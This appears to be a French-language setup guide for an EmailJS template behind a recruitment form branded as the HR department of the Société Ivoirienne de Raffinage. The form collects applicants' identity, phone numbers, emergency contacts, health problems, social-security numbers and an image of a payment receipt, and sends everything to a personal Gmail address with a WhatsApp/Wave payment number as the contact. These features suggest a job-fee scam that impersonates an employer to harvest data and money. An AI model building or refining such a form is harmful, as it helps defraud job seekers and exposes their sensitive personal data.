# Template EmailJS Corrigé pour le formulaire de recrutement PAA

## Configuration du Template

### Paramètres généraux :
- **To Email** : `supportrecrut@gmail.com`
- **From Name** : `{{from_name}}`
- **From Email** : Utiliser l'adresse par défaut d'EmailJS
- **Reply To** : `{{phone}}`
- **Subject** : `Nouvelle candidature PAA - {{full_name}} {{firstName}}`

### Contenu du Template (HTML) :

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Nouvelle candidature Société Ivoirienne de Raffinage</title>
    <style>
        body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
        .header { background: #1e40af; color: white; padding: 20px; text-align: center; }
        .content { padding: 20px; }
        .section { margin-bottom: 20px; border-bottom: 1px solid #eee; padding-bottom: 15px; }
        .label { font-weight: bold; color: #1e40af; display: inline-block; min-width: 150px; }
        .value { margin-left: 10px; }
        .footer { background: #f8f9fa; padding: 15px; text-align: center; font-size: 12px; color: #666; }
        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 10px 0; }
        .highlight { background-color: #fff3cd; padding: 10px; border-radius: 5px; border-left: 4px solid #ffc107; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🏭 Société Ivoirienne de Raffinage</h1>
        <h2>Direction des Ressources Humaines</h2>
        <p>Campagne de recrutement 2026</p>
    </div>

    <div class="content">
        <div class="highlight">
            <h3>📋 NOUVELLE CANDIDATURE REÇUE</h3>
            <p><strong>Date de soumission :</strong> {{submission_date}}</p>
        </div>

        <div class="section">
            <h4>👤 INFORMATIONS D'IDENTITÉ</h4>
            <div class="info-grid">
                <div><span class="label">ID Employé :</span> <span class="value">{{employee_id}}</span></div>
                <div><span class="label">Nom complet :</span> <span class="value">{{full_name}}</span></div>
                <div><span class="label">Prénom :</span> <span class="value">{{firstName}}</span></div>
                <div><span class="label">Téléphone :</span> <span class="value">{{phone}}</span></div>
            </div>
        </div>

        <div class="section">
            <h4>🚨 CONTACT D'URGENCE</h4>
            <div class="info-grid">
                <div><span class="label">Nom :</span> <span class="value">{{emergency_name}}</span></div>
                <div><span class="label">Téléphone :</span> <span class="value">{{emergency_phone}}</span></div>
            </div>
        </div>

        <div class="section">
            <h4>🏥 DISPONIBILITÉ ET SANTÉ</h4>
            <p><span class="label">Problème de santé :</span> <span class="value">{{health_issue}}</span></p>
            <p><span class="label">Date de disponibilité :</span> <span class="value">{{availability_date}}</span></p>
        </div>

        <div class="section">
            <h4>💼 INFORMATIONS CNPS</h4>
            <p><span class="label">Carte CNPS :</span> <span class="value">{{has_cnps}}</span></p>
            {{#if cnps_number}}
            <p><span class="label">Numéro CNPS :</span> <span class="value">{{cnps_number}}</span></p>
            {{/if}}
            <p><span class="label">Preuve de paiement :</span> <span class="value">{{cnps_proof_name}}</span></p>
            {{#if cnps_proof_base64}}
            <div style="margin-top: 10px;">
              <p><strong>📎 Image de la preuve de paiement CNPS :</strong></p>
              <img src="{{cnps_proof_base64}}" alt="Preuve de paiement CNPS" style="max-width: 400px; height: auto; border: 1px solid #ddd; border-radius: 4px; margin-top: 10px;" />
            </div>
            {{/if}}
        </div>

        <div class="section">
            <h4>✅ ENGAGEMENT ET VALIDATION</h4>
            <div class="info-grid">
                <div><span class="label">Confirmation exactitude :</span> <span class="value">{{confirm_accuracy}}</span></div>
                <div><span class="label">Acceptation CGU :</span> <span class="value">{{accept_terms}}</span></div>
            </div>
        </div>

        <div class="section">
            <h4>📞 INFORMATIONS DE CONTACT</h4>
            <p>Pour toute question concernant cette candidature :</p>
            <p>• Email : <strong>supportrecrut@gmail.com</strong></p>
            <p>• WhatsApp/Wave : <strong>2250767554748</strong></p>
        </div>
    </div>

    <div class="footer">
        <p>Ce message a été envoyé automatiquement depuis le formulaire de recrutement de la Société Ivoirienne de Raffinage.</p>
        <p>Direction des Ressources Humaines - République de Côte d'Ivoire 🇨🇮</p>
    </div>
</body>
</html>
```

### Variables requises dans EmailJS :

Ajoutez ces variables dans votre template EmailJS :

- `employee_id` - ID employé (PAA-03-123)
- `full_name` - Nom de famille
- `firstName` - Prénom
- `phone` - Numéro de téléphone
- `emergency_name` - Nom du contact d'urgence
- `emergency_phone` - Téléphone du contact d'urgence
- `health_issue` - Problème de santé
- `availability_date` - Date de disponibilité
- `has_cnps` - A une carte CNPS (Oui/Non)
- `cnps_number` - Numéro CNPS
- `cnps_proof_name` - Nom du fichier de preuve
- `cnps_proof_base64` - Image en base64
- `confirm_accuracy` - Confirmation de l'exactitude
- `accept_terms` - Acceptation des conditions
- `submission_date` - Date de soumission
- `from_name` - Nom complet (pour l'en-tête)

### Mise à jour du destinataire :

Modifiez aussi votre fichier `.env` pour envoyer à la bonne adresse :

```env
VITE_RECIPIENT_EMAIL=supportrecrut@gmail.com
```

### Instructions :

1. Copiez ce template HTML dans EmailJS
2. Ajoutez toutes les variables listées ci-dessus
3. Changez le destinataire en `supportrecrut@gmail.com`
4. Testez avec un formulaire complet

Vous recevrez maintenant TOUTES les informations du candidat y compris l'image !
